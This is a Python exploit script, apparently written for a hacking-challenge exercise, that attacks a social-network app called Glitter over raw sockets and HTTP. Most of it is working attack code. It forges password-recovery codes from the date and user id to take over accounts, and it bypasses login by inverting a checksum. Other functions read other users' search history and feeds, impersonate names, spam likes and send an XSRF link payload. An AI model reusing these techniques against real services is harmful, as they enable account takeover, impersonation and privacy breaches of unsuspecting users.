import socket
import re
import json
import requests
import string
from datetime import datetime, timedelta
import hashlib

LOGIN = """100#{gli&&er}{"user_name":"USER","password":"PASS","enable_push_notifications":true}##"""
CHECK_SUM = """110#{gli&&er}ASCI_CODE##"""

FORMAT = 'CODE#{gli&&er}{DATA}##'
URL = "url"

IP = "ip"
GET_RECV = 1024
PORT = 1336
sparkle_cookie = 0
letter = 65
max_witout = 10
zero = "0"


def number_to_letters(number):
    """
    create middal word to fit id
    :param number:
    :return:the word
    """
    first_letter = letter
    return ''.join(chr(int(digit) + first_letter) for digit in str(number))

def challange_password(glit_id,sparkle_cookie):
    """
    func log out from original user and get the password
    :return:
    """
    logout_html(glit_id,sparkle_cookie)
    current_date = datetime.now()
    day = current_date.day
    month = current_date.month
    time_str = current_date.strftime("%H%M")
    password_recover_path = "password-recovery-code-request/"
    recover = URL+password_recover_path
    user_name = input("enter user you want to recover password:")
    req = requests.post(recover, json=user_name)
    print(req.text)

    id_user_pass = input("Enter id of the user:")

    word = number_to_letters(id_user_pass)

    if day < max_witout:
        day = zero+str(day)
    if month < max_witout:
        month = zero+str(month)
    revored_str = str(day)+str(month)+word+str(time_str)
    revored_str = revored_str.replace(" ","")
    data = [user_name, revored_str]

    json_payload = json.dumps(data, separators=(',', ':'))


    recover = recover.replace("password-recovery-code-request", "password-recovery-code-verification")
    # Send the POST request with the JSON payload
    headers = {
    'Host': 'glitter.org.il',
    'Connection': 'keep-alive',
    'Content-Length': str(len(json_payload)),
    'Accept': 'application/json, text/plain, */*',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://glitter.org.il',
    'Referer': 'http://glitter.org.il/password-recovery',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'he,en-US;q=0.9,en;q=0.8'
}
    response = requests.post(recover, data=json_payload, headers=headers)

    # Print the response from the server
    print(response.text)

def logout(clientSocket,glit_id):
    """
    func log out from app user
    :return:
    """
    log_out = "200#{gli&&er}number##"
    log_out = log_out.replace("number",str(glit_id))
    clientSocket.sendall(log_out.encode())
    get_message = clientSocket.recv(GET_RECV).decode()
    if re.search(r'not reported as',get_message):
        print("the user isnt conncted")
    if re.search(r'approved',get_message):
        print("logout.")

def logout_html(glit_id,sparkle_cookie):
    """
    func log out from html user
    :return:
    """
    urls =f"/user/{glit_id}"
    req = requests.delete(URL+urls,cookies={'sparkle': sparkle_cookie})

def get_password(target_ascii_sum):
    """
    func get password that the asci number is it
    :param target_ascii_sum:
    :return:
    """
    password = []
    current_sum = 0

    # Adding 'z' until adding another '0' would exceed the target_ascii_sum
    while current_sum + ord('z') <= target_ascii_sum - ord('0'):
        password.append('z')
        current_sum += ord('z')

        # Check if adding '0' exceeds the target_ascii_sum
        if current_sum + ord('0') <= target_ascii_sum:
            password.append('0')
            current_sum += ord('0')
        else:
            break

    # Add the last character to reach the target_ascii_sum
    if current_sum < target_ascii_sum:
        password.append(chr(target_ascii_sum - current_sum))

    return ''.join(password)

def Login_challange(clientSocket,glit_id):
    """
    func login to parson
    :param clientSocket:
    :param glit_id:
    :return:
    """
    global CHECK_SUM #message upper
    logout(clientSocket,glit_id)
    user_name = input("enter user you want to login:")
    login_exm = LOGIN
    login_exm = login_exm.replace("USER", user_name).replace("PASS", "example")
    clientSocket.sendall(login_exm.encode())
    get_message = clientSocket.recv(GET_RECV).decode()
    match = re.search(r'checksum: (\d+)',get_message)
    if match:
        asci_checksum  = match.group(1)
        asci_of_user = int(sum(ord(char) for char in user_name))
        password_checksum = int(asci_checksum) - asci_of_user
        password = get_password(password_checksum)
        login_exm = LOGIN
        login_exm = login_exm.replace("USER", user_name).replace("PASS", password)
        clientSocket.sendall(login_exm.encode())
        get_message = clientSocket.recv(GET_RECV).decode()
        print(get_message)
        exm_check_sum = CHECK_SUM.replace("ASCI_CODE", asci_checksum)
        clientSocket.sendall(exm_check_sum.encode())
        get_message = clientSocket.recv(GET_RECV).decode()
        print(get_message)
        match = re.search(r'id":(\d+)', get_message)
        if match:
            glit_id = match.group(1)
        print("your id:",glit_id)
        match = re.search(r'password":"(\d+)"',get_message)
        if match:
            password = match.group(1)
        print("password:",password)
        return  glit_id,user_name,password
    else:
        print("user not exsist")
        return None,None,None

def users(sparkle_cookie):
    """
    func get user by number
    :param sparkle_cookie:
    :return:
    """
    url_et = URL+"entity/number"
    id = input("Enter number of id(exm:18175): ")
    full_url = url_et.replace("number", id)
    try:
        response = requests.get(full_url,cookies={'sparkle': sparkle_cookie})
        if re.search(r'id',response.text):
            print(response.text)
        else:
            print("id not exsits")

    except Exception as e:
        print(f"An error occurred: {e}")

def login_and_fetch_data(user, password):
    """
    func Login to the user
    :param user: str
    :param password:str
    :return: true or false , user id , cookies
    """

    login_url = URL + "login"
    user_url = URL + "user"
    entity_url = "entity/number"
    req_url = "requests?id=number"
    glit_url = "/glits?feedOwnerId=number"

    print("Login..")
    response = requests.get(login_url)

    # Perform the login POST request
    response = requests.post(user_url, json=[user, password])
    macth = re.search(r'A user with the given',response.text)
    if macth:
        print("stil conncted")
        return False,None,None
    print(response.text)
    # Extract the user ID from the response
    match = re.search(r'id":(\d+)', response.text)
    if match:
        id_user = match.group(1)
    else:
        print("User ID not found in the response,someting went wrong.")
        return False,None,None

    # Extract the 'sparkle' cookie from the response
    cookies = re.search(r'"sparkle":"(.*?)"', response.text)
    if cookies:
        sparkle_cookie = cookies.group(1)
    else:
        print("Sparkle cookie not found in the response.")
        return False,None,None

    # Replace 'number' in URLs with the user ID
    entity_url = entity_url.replace("number", str(id_user))

    # Make the GET request with the extracted cookie
    response = requests.get(URL + entity_url, cookies={'sparkle': sparkle_cookie})
    if re.search(r'id',response.text) :
        print("Login success for the html")
        return True,id_user, sparkle_cookie
    else:
        print("someting went wrong")
        return False,None,None

def search_bug(clientSocket,data):
    """
    Searches for a specific entry in the system.

    :param data: The search entry to be looked up.
    :type data: str
    :param clientSocket:
    :return:
    """
    search_request = change_format("300", '"search_type":"SIMPLE","search_entry":"search_data"')
    data = search_request.replace("search_data", data)
    clientSocket.sendall(data.encode())
    print(clientSocket.recv(GET_RECV).decode())

def send_follow_to_yourself(clientSocket,glit_id):
    """
    func follow to my self
    :param clientSocket:
    :param glit_id: str
    :return:
    """
    data = "410#{gli&&er}[user_id,user_id]##"
    data = data.replace("user_id",glit_id)
    clientSocket.sendall(data.encode())
    message = clientSocket.recv(GET_RECV).decode()
    if re.search(r'already exists',message):
        print("your already follow yourself")
        return
    if re.search(r'was sent',message):
        print("seccess")

    print(message)

def change_display_name(clientSocket,name,glit_id):
    """
    Changes the display name for a reply.

    :param name: The new display name to be set.
    :type name: str
    :param clientSocket:
    :param glit_id:
    :type glit_id:str
    :return:
    """
    glit_wanted,content = get_gilts(clientSocket,glit_id)
    now = datetime.now()

    date_part = now.date()  # datetime.date object
    time_part = now.time()  # datetime.time object

    # Format the date string in ISO 8601 format with UTC time zone
    date_str = f"{date_part.year:04}-{date_part.month:02}-{date_part.day:02}T{time_part.hour:02}:{time_part.minute:02}:{time_part.second:02}.{time_part.microsecond:06}Z"

    wanted_text = input("wanted text:")
    display_name_request = change_format("650", f'"glit_id":{glit_wanted},"user_id":{glit_id},"user_screen_name":"{name}","id":-1,"content":"{wanted_text}","date":"{date_str}"')
    clientSocket.sendall(display_name_request.encode())
    print(clientSocket.recv(GET_RECV).decode())

def post_with_changed_year(clientSocket,year,name,glit_id):
    """
    Posts a new glit with a changed year.

    :param year: The year to be set in the post's date.
    :type year: int
    :param clientSocket:
    :param name:
    :type name: str
    :param glit_id:
    :type glit_id: str
    :return:
    """
    wanted_cont = input("enter contented: ")
    post_request = change_format("550", (f'"feed_owner_id":id_user,"publisher_id":id_user,"publisher_screen_name":"userr","publisher_avatar":"im1","background_color":"White","date":"{year}-06-22T13:47:11.485Z","content":"{wanted_cont}","font_color":"black","id":-1'.replace("userr", name)).replace("id_user",glit_id))
    clientSocket.sendall(post_request.encode())
    print(clientSocket.recv(GET_RECV).decode())

def get_gilts(clientSocket,glit_id):
    """
    fucn get 2 of feed glits in app
    :param clientSocket:
    :param glit_id:
    :return: chosen glit ,choseen content
    """
    now = datetime.now()

    date_part = now.date()  # datetime.date object
    time_part = now.time()  # datetime.time object

    # Format the date string in ISO 8601 format with UTC time zone
    date_str = f"{date_part.year:04}-{date_part.month:02}-{date_part.day:02}T{time_part.hour:02}:{time_part.minute:02}:{time_part.second:02}.{time_part.microsecond:06}Z"

    massg =change_format("500", ((f'"feed_owner_id":{glit_id},"end_date":"{date_str}","glit_count":2')))
    clientSocket.sendall(massg.encode())
    message = (clientSocket.recv(GET_RECV).decode())

    start = message.find('[')
    end = message.find('"commentsMap"')
    if start == -1 or end == -1:
        print("Invalid message format.")
        return None, None

    substring = message[start:end]

    # Regular expression pattern to match "content" and "id"
    pattern = re.compile(r'"content":"(.*?)".*?"id":(\d+)')

    # Find all matches in the substring
    matches = pattern.findall(substring)

    # Display the matches to the user
    for i, (content, glit_id) in enumerate(matches, 1):
        print(f"{i}. Content: {content}")

    # Allow the user to choose an index
    chosen_index = int(input(f"Enter choice (1 to {len(matches)}): "))

    # Validate user input
    while chosen_index < 1 or chosen_index > len(matches):
        print(f"Invalid choice. Please enter a number between 1 and {len(matches)}.")
        chosen_index = int(input(f"Enter choice (1 to {len(matches)}): "))

    # Retrieve chosen content and glit_id based on user's choice
    chosen_content, chosen_glit_id = matches[chosen_index - 1]

    return chosen_glit_id, chosen_content

def privacy_challenge(clientSocket):
    """
    get history search of andor peson
    :param clientSocket:
    :return:
    """
    wanted = int(input("enter id user you want his history search(Exmple-43264):"))
    find = "320#{gli&&er}number##"
    find = find.replace("number",str(wanted))
    clientSocket.sendall(find.encode())
    print(clientSocket.recv(GET_RECV).decode())

def like_spam(clientSocket,name,glit_id):
    """
    Sends multiple like requests to make the user appear more popular.
    :param clientSocket:
    :param name:
    :param glit_id:
    :return:
    """
    glit_wanted,content = get_gilts(clientSocket,glit_id)
    print(glit_wanted,content)
    like_request = change_format("710", ((f'"glit_id":{glit_wanted},"user_id":usrId,"user_screen_name":"userr","id":-1').replace("userr", name)).replace("usrId",glit_id))
    for j in range(3):
        clientSocket.sendall(like_request.encode())
        print(clientSocket.recv(GET_RECV).decode())

def login_feed_info_disclosure(clientSocket,glit_id):
    """
    Retrieves login information disclosure.
    :param clientSocket:
    :param glit_id:
    :return:
    """
    wanted_feed = input(f'enter number id of the owner feed you want to see(for example yours: "{glit_id}"):')

    now = datetime.now()
    date_part = now.date()  # datetime.date object
    time_part = now.time()  # datetime.time object

    # Format the date string in ISO 8601 format with UTC time zone
    date_str = f"{date_part.year:04}-{date_part.month:02}-{date_part.day:02}T{time_part.hour:02}:{time_part.minute:02}:{time_part.second:02}.{time_part.microsecond:06}Z"

    login_request = change_format("500", f'"feed_owner_id":{wanted_feed},"end_date":"{date_str}","glit_count":2')
    clientSocket.sendall(login_request.encode())
    print(clientSocket.recv(GET_RECV).decode())

def xsrf_challange(name,id_user,sparkle_cookie):
    """
    func create a post with xsrf
    :param name:
    :param id_user:
    :param sparkle_cookie:
    :return:
    """
    now = datetime.now()

    # Extract the date and time parts
    date_part = now.date()  # datetime.date object
    time_part = now.time()  # datetime.time object

    date_str = f"{date_part.year:04}-{date_part.month:02}-{date_part.day:02}T{time_part.hour:02}:{time_part.minute:02}:{time_part.second:02}.{time_part.microsecond:06}Z"
    date_fut = f"{date_part.year:04}-{date_part.month:02}-{date_part.day:02}T{time_part.hour:02}:{time_part.minute:02}:{time_part.second:02}.{time_part.microsecond:06}Z"
    date_fut_dt = datetime.strptime(date_fut, "%Y-%m-%dT%H:%M:%S.%fZ")
    date_fut_dt_plus_one_min = date_fut_dt + timedelta(minutes=5)
    date_fut_plus_one_min = date_fut_dt_plus_one_min.strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    text = input("enter text for message:")
    text = text.replace(" ","%2520")
    xsrf_mas = f"""/glit?id=-1&feed_owner_id=id_user&publisher_id=id_user&publisher_screen_name=userr&publisher_avatar=im1&background_color=White&date={date_str}&content=%3C!DOCTYPE%20html%3E%20%3Chtml%20lang=%22en%22%3E%20%3Chead%3E%20%20%20%20%20%3Cmeta%20charset=%22UTF-8%22%3E%20%20%20%20%20%3Cmeta%20name=%22viewport%22%20content=%22width=device-width,%20initial-scale=1.0%22%3E%20%20%20%20%20%3Ctitle%3ELink%20Example%3C/title%3E%20%3C/head%3E%20%3Cbody%3E%20%20%20%20%20%3Ca%20href=%22http://glitter.org.il/glit?id=-1%26feed_owner_id=id_user%26publisher_id=id_user%26publisher_screen_name=userr%26publisher_avatar=im1%26background_color=White%26date={date_fut}%26content={text}%26font_color=black%22%3E%20%20%20%20%20%20%20%20%20Click%20here%20to%20view%20the%20post%20%20%20%20%20%3C/a%3E%20%3C/body%3E%20%3C/html%3E&font_color=black"""
    xsrf_mas = xsrf_mas.replace("id_user",id_user).replace("userr",name)
    url_need = URL+xsrf_mas
    req = requests.get(url_need,cookies={'sparkle':sparkle_cookie})
    print(req.text)

def change_format(code, data):
    """
    Changes the format of the message to be sent.

    :param code: The operation code.
    :type code: str
    :param data: The data to be included in the message.
    :type data: str
    :return: The formatted message.:type: str
    """
    return FORMAT.replace("CODE", code).replace("DATA", data)

def menu_app():
    """
    Displays the menu of available actions.
    """
    print("1. Search Information Disclosure")
    print("2. Change Display Name for Reply")
    print("3. Change Year in New Glit")
    print("4. Make Me Famous with Likes")
    print("5. Login to feed Information Disclosure")
    print("6. sent follow to my self")
    print("7. the connection between two people")
    print("8. updeted feed for sombady else")
    print("9. get ditales of user")

def menu_html():
    """
    Displays the menu of available actions.
    """
    print("10. id to detailes")

def chalnges():
    """
    Display the menu of the challanges
    """
    print("11. Login challange ")
    print("12. password challange")
    print("13. Privacy challenge")
    print("14. xsrf")
    print("else: exit")

def login_info():
    """
    func get login info
    :return: name and password
    """
    name = input("Enter your user name: ")
    password = input("Enter your password: ")
    return name,password

def connection_between_people(clientSocket,glit_id):
    """
    func check the connection between people
    :param clientSocket:
    :param glit_id:
    :return:
    """
    massage = "400#{gli&&er}[id_user_first,id_user_sec]##"
    id_user_first = input("enter first id user:")
    id_user_sec = input("enter second id user:")
    massage = massage.replace("id_user_sec",id_user_sec).replace("id_user_first",id_user_first)
    clientSocket.sendall(massage.encode())
    print(clientSocket.recv(GET_RECV).decode())

def update(clientSocket):
    """
    func check update messages
    :param clientSocket:
    :return:
    """
    massage  = "440#{gli&&er}number##"
    id_user_other = input("enter number of a id user you want to see updates:")
    massage = massage.replace("number",id_user_other)
    clientSocket.sendall(massage.encode())
    print(clientSocket.recv(GET_RECV).decode())

def user_info_app(clientSocket):
    """
    func check update messages
    :param clientSocket:
    :return:
    """
    massage = "310#{gli&&er}number##"
    id_user_other = input("enter number of a id user you want to see ditalis:")
    massage = massage.replace("number",id_user_other)
    clientSocket.sendall(massage.encode())
    print(clientSocket.recv(GET_RECV).decode())
